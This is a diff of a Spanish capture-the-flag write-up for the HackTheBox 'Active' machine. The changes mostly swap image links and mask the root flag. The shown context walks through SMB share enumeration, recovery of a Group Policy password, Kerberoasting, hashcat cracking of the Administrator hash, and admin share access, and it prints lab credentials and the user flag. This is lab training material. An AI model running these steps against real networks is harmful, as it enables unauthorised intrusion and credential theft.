@@ -58,18 +58,20 @@ Host script results:
 ```
 crackmapexec smb 10.10.10.100 -u '' -p '' --shares
 ```
+<img width="859" height="211" alt="Pasted image 20250604184134" src="https://github.com/user-attachments/assets/ab3c331e-75a1-4d7e-9525-7f31067a99dc" />
 
-![[Pasted image 20250604184134.png]]
+
 
 ```
 smbclient //10.10.10.100/Replication -N
 ```
+<img width="641" height="303" alt="Pasted image 20250604184501" src="https://github.com/user-attachments/assets/aefee43a-2d88-4522-8482-5728c562224c" />
 
-![[Pasted image 20250604184501.png]]
 
 - Encontramos un xml con credenciales dentro.
 
-![[Pasted image 20250604185119.png]]
+<img width="856" height="190" alt="Pasted image 20250604185119" src="https://github.com/user-attachments/assets/2a03f706-64b8-4272-b951-7d00081c9986" />
+
 
 SVC_TGS 
 GPPstillStandingStrong2k18
@@ -80,7 +82,8 @@ GPPstillStandingStrong2k18
 crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
 ```
 
-![[Pasted image 20250604191813.png]]
+<img width="903" height="214" alt="Pasted image 20250604191813" src="https://github.com/user-attachments/assets/c93bc622-a6f2-49c8-9889-9c0749751a9b" />
+
 
 - Nos conectamos a la carpeta Users con las creedenciales.
 
@@ -88,11 +91,11 @@ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --sha
 smbclient //10.10.10.100/Users -U SVC_TGS
 ```
 
-![[Pasted image 20250604192002.png]]
+<img width="616" height="362" alt="Pasted image 20250604192002" src="https://github.com/user-attachments/assets/710ac4da-9f5d-4ae3-8613-1c798b2bdbbb" />
 
 - La flag de user.
 
-![[Pasted image 20250604192224.png]]
+<img width="617" height="95" alt="Pasted image 20250604192224" src="https://github.com/user-attachments/assets/31b6b6b4-2940-4685-9143-42a38deca0d6" />
 
 ### ASP
 
@@ -117,7 +120,7 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d97ef59683009eff
 hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20250604193126.png]]
+<img width="431" height="195" alt="Pasted image 20250604193126" src="https://github.com/user-attachments/assets/09c68eaf-d8b1-4b3f-a33c-daef8a101087" />
 
 Administrator:Ticketmaster1968
 
@@ -125,7 +128,7 @@ Administrator:Ticketmaster1968
 crackmapexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968 
 ```
 
-![[Pasted image 20250604193636.png]]
+<img width="1203" height="108" alt="Pasted image 20250604193636" src="https://github.com/user-attachments/assets/a9c1ca60-8e51-4065-9a51-77aac90c5f4e" />
 
 ---
 
@@ -135,7 +138,7 @@ crackmapexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968
 smbclient //10.10.10.100/C$ -U Administrator   
 ```
 
-![[Pasted image 20250604195859.png]]
+<img width="1131" height="769" alt="Pasted image 20250604195859" src="https://github.com/user-attachments/assets/f592d287-f8ae-4866-9474-d69f69269006" />
 
 ---
 
@@ -149,14 +152,6 @@ smbclient //10.10.10.100/C$ -U Administrator
 
 | **User Flag** | ad61fd69e87cafb69c5e95ac297f3555 |
 | ------------- | -------------------------------- |
-| **Root Flag** | b0f084d99f0b46841e56261b6a41edeb |
+| **Root Flag** | ******************************** |
 
 ---
-
-## **5️ - Notas y Aprendizajes**
-
-### **Errores y Obstáculos**
-
-### **Métodos Alternativos**
-
-### **Herramientas Utilizadas**
